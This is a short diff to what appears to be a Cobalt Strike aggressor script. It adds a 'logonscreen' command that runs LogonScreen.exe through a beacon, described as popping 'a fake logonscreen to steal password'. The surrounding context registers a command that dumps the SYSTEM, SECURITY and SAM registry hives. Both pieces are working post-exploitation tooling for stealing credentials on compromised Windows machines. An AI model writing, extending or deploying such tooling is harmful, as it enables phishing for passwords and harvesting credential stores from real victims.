@@ -47,3 +47,14 @@ beacon_command_register(
     "hivejack",
     "dump SYSTEM, SECURITY and SAM registry hives",
     "");
+
+alias logonscreen{
+    bexecute_assembly($1, script_resource("post/LogonScreen.exe"), "");
+    btask($1, "Waiting for reception......", "");
+}
+
+
+beacon_command_register(
+    "logonscreen",
+    "pop a fake logonscreen to steal password",
+    "");
